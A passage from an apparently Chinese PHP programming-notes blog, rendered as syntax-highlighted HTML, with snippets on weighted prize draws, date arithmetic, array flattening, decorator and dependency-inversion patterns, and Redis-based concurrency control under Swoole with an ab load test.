class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_rand</span>(<span class="params">$proArr</span>) </span>&#123; </span><br><span class="line">    $result = <span class="string">''</span>; </span><br><span class="line"> </span><br><span class="line">    <span class="comment">//概率数组的总概率精度 </span></span><br><span class="line">    $proSum = array_sum($proArr); </span><br><span class="line"> </span><br><span class="line">    <span class="comment">//概率数组循环 </span></span><br><span class="line">    foreach ($proArr <span class="keyword">as</span> $key =&gt; $proCur) &#123; </span><br><span class="line">        $randNum = mt_rand(<span class="number">1</span>, $proSum); </span><br><span class="line">        <span class="keyword">if</span> ($randNum &lt;= $proCur) &#123; </span><br><span class="line">            $result = $key; </span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">            $proSum -= $proCur; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">    unset ($proArr); </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> $result; </span><br><span class="line">&#125; </span><br><span class="line">$prize_arr = array( </span><br><span class="line">    <span class="string">'0'</span> =&gt; array(<span class="string">'id'</span>=&gt;<span class="number">1</span>,<span class="string">'prize'</span>=&gt;<span class="string">'平板电脑'</span>,<span class="string">'v'</span>=&gt;<span class="number">1</span>), </span><br><span class="line">    <span class="string">'1'</span> =&gt; array(<span class="string">'id'</span>=&gt;<span class="number">2</span>,<span class="string">'prize'</span>=&gt;<span class="string">'数码相机'</span>,<span class="string">'v'</span>=&gt;<span class="number">5</span>), </span><br><span class="line">    <span class="string">'2'</span> =&gt; array(<span class="string">'id'</span>=&gt;<span class="number">3</span>,<span class="string">'prize'</span>=&gt;<span class="string">'音箱设备'</span>,<span class="string">'v'</span>=&gt;<span class="number">10</span>), </span><br><span class="line">    <span class="string">'3'</span> =&gt; array(<span class="string">'id'</span>=&gt;<span class="number">4</span>,<span class="string">'prize'</span>=&gt;<span class="string">'4G优盘'</span>,<span class="string">'v'</span>=&gt;<span class="number">12</span>), </span><br><span class="line">    <span class="string">'4'</span> =&gt; array(<span class="string">'id'</span>=&gt;<span class="number">5</span>,<span class="string">'prize'</span>=&gt;<span class="string">'10Q币'</span>,<span class="string">'v'</span>=&gt;<span class="number">22</span>), </span><br><span class="line">    <span class="string">'5'</span> =&gt; array(<span class="string">'id'</span>=&gt;<span class="number">6</span>,<span class="string">'prize'</span>=&gt;<span class="string">'下次没准就能中哦'</span>,<span class="string">'v'</span>=&gt;<span class="number">50</span>), </span><br><span class="line">); </span><br><span class="line">foreach ($prize_arr <span class="keyword">as</span> $key =&gt; $val) &#123; </span><br><span class="line">    $arr[$val[<span class="string">'id'</span>]] = $val[<span class="string">'v'</span>]; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">$rid = get_rand($arr); <span class="comment">//根据概率获取奖项id </span></span><br><span class="line"> </span><br><span class="line">$res[<span class="string">'yes'</span>] = $prize_arr[$rid<span class="number">-1</span>][<span class="string">'prize'</span>]; <span class="comment">//中奖项 </span></span><br><span class="line">unset($prize_arr[$rid<span class="number">-1</span>]); <span class="comment">//将中奖项从数组中剔除，剩下未中奖项 </span></span><br><span class="line">shuffle($prize_arr); <span class="comment">//打乱数组顺序 </span></span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($prize_arr);$i++)&#123; </span><br><span class="line">    $pr[] = $prize_arr[$i][<span class="string">'prize'</span>]; </span><br><span class="line">&#125; </span><br><span class="line">$res[<span class="string">'no'</span>] = $pr; </span><br><span class="line">echo json_encode($res); </span><br><span class="line">https:<span class="comment">//gist.github.com/flowerains/1e2e57906d496206a097</span></span><br><span class="line"></span><br><span class="line">$proArr = [<span class="string">'1'</span>=&gt;<span class="number">65</span>,<span class="string">'2'</span>=&gt;<span class="number">20</span>,<span class="string">'3'</span>=&gt;<span class="number">5</span>,<span class="string">'4'</span>=&gt;<span class="number">5</span>,<span class="string">'5'</span>=&gt;<span class="number">5</span>];</span><br><span class="line">$rank = get_rand($proArr);</span><br><span class="line">$i = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//统计次数</span></span><br><span class="line">$num1 = <span class="number">0</span>;</span><br><span class="line">$num2 = <span class="number">0</span>;</span><br><span class="line">$num3 = <span class="number">0</span>;</span><br><span class="line">$num4 = <span class="number">0</span>;</span><br><span class="line">$num5 = <span class="number">0</span>;</span><br><span class="line">$arr = array();</span><br><span class="line"><span class="keyword">do</span>&#123;</span><br><span class="line">    $rank = get_rand($proArr);</span><br><span class="line">    <span class="keyword">switch</span> ($rank) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            $num1++;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            $num2++;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            $num3++;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            $num4++;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            $num5++;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $arr[] = $rank;</span><br><span class="line">    $i++;</span><br><span class="line">&#125;<span class="keyword">while</span>($i &lt; <span class="number">100000</span>);</span><br><span class="line">$value1 = number_format($num1/count($arr),<span class="number">4</span>)*<span class="number">100</span>;</span><br><span class="line">$value2 = number_format($num2/count($arr),<span class="number">4</span>)*<span class="number">100</span>;</span><br><span class="line">$value3 = number_format($num3/count($arr),<span class="number">4</span>)*<span class="number">100</span>;</span><br><span class="line">$value4 = number_format($num4/count($arr),<span class="number">4</span>)*<span class="number">100</span>;</span><br><span class="line">$value5 = number_format($num5/count($arr),<span class="number">4</span>)*<span class="number">100</span>;</span><br><span class="line">echo <span class="string">"1的中奖率%$value1\n"</span>;</span><br><span class="line">echo <span class="string">"2的中奖率%$value2\n"</span>;</span><br><span class="line">echo <span class="string">"3的中奖率%$value3\n"</span>;</span><br><span class="line">echo <span class="string">"4的中奖率%$value4\n"</span>;</span><br><span class="line">echo <span class="string">"5的中奖率%$value5\n"</span>;</span><br></pre></td></tr></table></figure>
<h3 id="本月第一天"><a href="#本月第一天" class="headerlink" title="本月第一天"></a>本月第一天</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//上一周的周一周末 </span></span><br><span class="line">$start=date(<span class="string">"Y-m-d"</span>,strtotime(<span class="string">"2016-11-07"</span>.<span class="string">"-1 week Monday"</span>));</span><br><span class="line">echo date(<span class="string">"Y-m-d"</span>,strtotime(<span class="string">"$start +6 day"</span>));</span><br><span class="line"><span class="comment">//下一周的周一周末</span></span><br><span class="line">$start=date(<span class="string">"Y-m-d"</span>,strtotime(<span class="string">"2016-11-07"</span>.<span class="string">"+1 week Monday"</span>));   </span><br><span class="line">echo date(<span class="string">"Y-m-d"</span>,strtotime(<span class="string">"$start +6 day"</span>));  </span><br><span class="line"><span class="comment">//本月的第一天，最后一天    </span></span><br><span class="line">$start=date(<span class="string">'Y-m-01'</span>, strtotime(date(<span class="string">"Y-m-d"</span>)));   </span><br><span class="line">echo date(<span class="string">'Y-m-d'</span>, strtotime(<span class="string">"$start +1 month -1 day"</span>));</span><br></pre></td></tr></table></figure>
<h3 id="多维数组转一维数组"><a href="#多维数组转一维数组" class="headerlink" title="多维数组转一维数组"></a>多维数组转一维数组</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$a=array(</span><br><span class="line">    <span class="number">0</span>=&gt;array(</span><br><span class="line">      <span class="number">0</span>=&gt;<span class="string">"a"</span>,</span><br><span class="line">        <span class="number">1</span>=&gt;array(</span><br><span class="line">          <span class="number">0</span>=&gt;<span class="string">'b'</span></span><br><span class="line">        )</span><br><span class="line">    ),</span><br><span class="line">    <span class="number">1</span>=&gt;array(</span><br><span class="line">      <span class="number">0</span>=&gt;<span class="string">'c'</span>,</span><br><span class="line">        <span class="number">1</span>=&gt;<span class="string">'d'</span>,</span><br><span class="line">        <span class="number">2</span>=&gt;array(</span><br><span class="line">          <span class="number">0</span>=&gt;array(</span><br><span class="line">           <span class="string">"ddd"</span>=&gt;array(</span><br><span class="line">              <span class="number">0</span>=&gt;<span class="string">'e'</span>,</span><br><span class="line">               <span class="string">"a"</span>=&gt;<span class="string">'f'</span>,</span><br><span class="line">               <span class="number">1</span>=&gt;<span class="string">'g'</span></span><br><span class="line">            )</span><br><span class="line">          )</span><br><span class="line">        )</span><br><span class="line">    ),</span><br><span class="line">    <span class="string">'w'</span>=&gt;<span class="string">'h'</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">//获取未知维度数组最里面的值，换成一维数组https://3v4l.org/Mrjr1</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_array_value</span>(<span class="params">$data</span>)</span>&#123;</span><br><span class="line">  $result=array();</span><br><span class="line">  array_walk_recursive($data,<span class="function"><span class="keyword">function</span>(<span class="params">$value</span>) <span class="title">use</span> (<span class="params">&amp;$result</span>)</span>&#123;</span><br><span class="line">    array_push($result,$value);</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br><span class="line">print_r(get_array_value($a));</span><br><span class="line"><span class="built_in">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; a</span><br><span class="line">    [<span class="number">1</span>] =&gt; b</span><br><span class="line">    [<span class="number">2</span>] =&gt; c</span><br><span class="line">    [<span class="number">3</span>] =&gt; d</span><br><span class="line">    [<span class="number">4</span>] =&gt; e</span><br><span class="line">    [<span class="number">5</span>] =&gt; f</span><br><span class="line">    [<span class="number">6</span>] =&gt; g</span><br><span class="line">    [<span class="number">7</span>] =&gt; h</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<h3 id="面向对象的三大特性"><a href="#面向对象的三大特性" class="headerlink" title="面向对象的三大特性"></a>面向对象的三大特性</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line">封装，继承，多态 面向对象的五大原则</span><br><span class="line">         </span><br><span class="line">         单一职责原则，开放封闭原则，里氏替换原则，依赖倒置原则，接口隔离原则</span><br><span class="line">         </span><br><span class="line">         </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 输出一个字符串</span></span><br><span class="line"><span class="comment"> * 装饰器动态添加功能</span></span><br><span class="line"><span class="comment"> * Class EchoText</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EchoText</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    protected $decorator = [];</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">Index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//调用装饰器前置操作</span></span><br><span class="line">        $<span class="keyword">this</span>-&gt;beforeEcho();</span><br><span class="line">        echo <span class="string">"你好，我是装饰器。"</span>;</span><br><span class="line">        <span class="comment">//调用装饰器后置操作</span></span><br><span class="line">        $<span class="keyword">this</span>-&gt;afterEcho();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//增加装饰器</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">addDecorator</span>(<span class="params">Decorator $decorator</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;decorator[] = $decorator;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//执行装饰器前置操作 先进先出原则</span></span><br><span class="line">    protected <span class="function"><span class="keyword">function</span> <span class="title">beforeEcho</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        foreach ($<span class="keyword">this</span>-&gt;decorator <span class="keyword">as</span> $decorator)</span><br><span class="line">            $decorator-&gt;before();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//执行装饰器后置操作 先进后出原则</span></span><br><span class="line">    protected <span class="function"><span class="keyword">function</span> <span class="title">afterEcho</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $tmp = array_reverse($<span class="keyword">this</span>-&gt;decorator);</span><br><span class="line">        foreach ($tmp <span class="keyword">as</span> $decorator)</span><br><span class="line">            $decorator-&gt;after();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 装饰器接口</span></span><br><span class="line"><span class="comment"> * Class Decorator</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">interface Decorator</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">before</span>(<span class="params"></span>);</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    <span class="title">public</span> <span class="title">function</span> <span class="title">after</span>(<span class="params"></span>);</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">/**</span></span><br><span class="line"><span class="function"> * 颜色装饰器实现</span></span><br><span class="line"><span class="function"> * <span class="title">Class</span> <span class="title">ColorDecorator</span></span></span><br><span class="line"><span class="function"> */</span></span><br><span class="line"><span class="function"><span class="title">class</span> <span class="title">ColorDecorator</span> <span class="title">implements</span> <span class="title">Decorator</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    protected $color;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$color</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;color = $color;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">before</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        echo <span class="string">"&lt;dis style='color: &#123;$this-&gt;color&#125;'&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">after</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        echo <span class="string">"&lt;/div&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 字体大小装饰器实现</span></span><br><span class="line"><span class="comment"> * Class SizeDecorator</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SizeDecorator</span> <span class="title">implements</span> <span class="title">Decorator</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    protected $size;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$size</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;size = $size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">before</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        echo <span class="string">"&lt;dis style='font-size: &#123;$this-&gt;size&#125;px'&gt;**"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">after</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        echo <span class="string">"&lt;/div&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实例化输出类</span></span><br><span class="line">$echo = <span class="keyword">new</span> EchoText();</span><br><span class="line"><span class="comment">//增加装饰器</span></span><br><span class="line">$echo-&gt;addDecorator(<span class="keyword">new</span> ColorDecorator(<span class="string">'red'</span>));</span><br><span class="line"><span class="comment">//增加装饰器</span></span><br><span class="line">$echo-&gt;addDecorator(<span class="keyword">new</span> SizeDecorator(<span class="string">'22'</span>));</span><br><span class="line"><span class="comment">//输出</span></span><br><span class="line">$echo-&gt;Index();</span><br><span class="line">interface employee</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">working</span>(<span class="params"></span>);</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">class</span> <span class="title">teacher</span> <span class="title">implements</span> <span class="title">employee</span>//具体应该依赖与抽象</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">working</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        echo <span class="string">'teaching...'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">coder</span> <span class="title">implements</span> <span class="title">employee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">working</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        echo <span class="string">'coding...'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">workA</span>//例子1</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">work</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $teacher = <span class="keyword">new</span> teacher;</span><br><span class="line">        $teacher-&gt;working();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">workB</span>//例子2</span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    private $e;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params">employee $e</span>)</span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;e = $e;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">work</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;e-&gt;working();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$worka = <span class="keyword">new</span> workA;<span class="comment">//workA 依赖于 teacher 类 不符合依赖倒置原则</span></span><br><span class="line">$worka-&gt;work();</span><br><span class="line">$workb = <span class="keyword">new</span> workB;<span class="comment">//workB 不依赖与某个类 既可以注入 teacher 也可以 注入 coder</span></span><br><span class="line">$workb-&gt;set(<span class="keyword">new</span> teacher());</span><br><span class="line">$workb-&gt;work();</span><br><span class="line">https:<span class="comment">//learnku.com/articles/30034#267039</span></span><br></pre></td></tr></table></figure>
<h3 id="PHP-并发"><a href="#PHP-并发" class="headerlink" title="PHP 并发"></a>PHP 并发</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">使用队列，额外起一个进程处理队列，并发请求都放到队列中，由额外进程串行处理，并发问题就不存在了，但是要额外进程支持以及处理延迟严重，本文不先不讨论这种方法。</span><br><span class="line">利用数据库事务特征，做原子更新，此方法需要依赖数据库的事务特性。</span><br><span class="line">借助文件排他锁，在处理下单请求的时候，用 flock 锁定一个文件，成功拿到锁的才能处理订单</span><br><span class="line">&lt;?php</span><br><span class="line">$http = <span class="keyword">new</span> swoole_http_server(<span class="string">"0.0.0.0"</span>, <span class="number">9509</span>);   <span class="comment">// 监听 9509</span></span><br><span class="line"></span><br><span class="line">$http-&gt;set(array(</span><br><span class="line">    <span class="string">'reactor_num'</span> =&gt; <span class="number">2</span>,  <span class="comment">//reactor thread num</span></span><br><span class="line">    <span class="string">'worker_num'</span> =&gt; <span class="number">4</span>    <span class="comment">//worker process num</span></span><br><span class="line">));</span><br><span class="line"></span><br><span class="line">$http-&gt;on(<span class="string">'request'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">swoole_http_request $request, swoole_http_response $response</span>) </span>&#123;</span><br><span class="line">    $uniqid = uniqid(<span class="string">'uid-'</span>, TRUE);    <span class="comment">// 模拟唯一用户ID</span></span><br><span class="line">    $redis = <span class="keyword">new</span> Redis();</span><br><span class="line">    $redis-&gt;connect(<span class="string">'127.0.0.1'</span>, <span class="number">6379</span>);    <span class="comment">// 连接 redis</span></span><br><span class="line"></span><br><span class="line">    $redis-&gt;watch(<span class="string">'rest_count'</span>);  <span class="comment">// 监测 rest_count 是否被其它的进程更改</span></span><br><span class="line"></span><br><span class="line">    $rest_count = intval($redis-&gt;get(<span class="string">"rest_count"</span>));  <span class="comment">// 模拟唯一订单ID</span></span><br><span class="line">    <span class="keyword">if</span> ($rest_count &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        $value = <span class="string">"&#123;$rest_count&#125;-&#123;$uniqid&#125;"</span>;  <span class="comment">// 表示当前订单，被当前用户抢到了</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// do something ... 主要是模拟用户抢到单后可能要进行的一些密集运算</span></span><br><span class="line">        $rand  = rand(<span class="number">100</span>, <span class="number">1000000</span>);</span><br><span class="line">        $sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $rand; $i++) &#123;$sum += $i;&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// redis 事务</span></span><br><span class="line">        $redis-&gt;multi();</span><br><span class="line">        $redis-&gt;lPush(<span class="string">'uniqids'</span>, $value);</span><br><span class="line">        $redis-&gt;decr(<span class="string">'rest_count'</span>);</span><br><span class="line">        $replies = $redis-&gt;exec();  <span class="comment">// 执行以上 redis 事务</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// 如果 rest_count 的值被其它的并发进程更改了，以上事务将回滚</span></span><br><span class="line">        <span class="keyword">if</span> (!$replies) &#123;</span><br><span class="line">            echo <span class="string">"订单 &#123;$value&#125; 回滚"</span> . PHP_EOL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $redis-&gt;unwatch();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$http-&gt;start();</span><br><span class="line">使用 ab 测试https:<span class="comment">//learnku.com/articles/29686</span></span><br><span class="line"></span><br><span class="line">$ ab -t <span class="number">20</span> -c <span class="number">10</span> http:<span class="comment">//192.168.1.104:9509/</span></span><br></pre></td></tr></table></figure>
<h3 id="PHP-守护程序"><a href="#PHP-守护程序" class="headerlink" title="PHP 守护程序"></a>PHP 守护程序</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 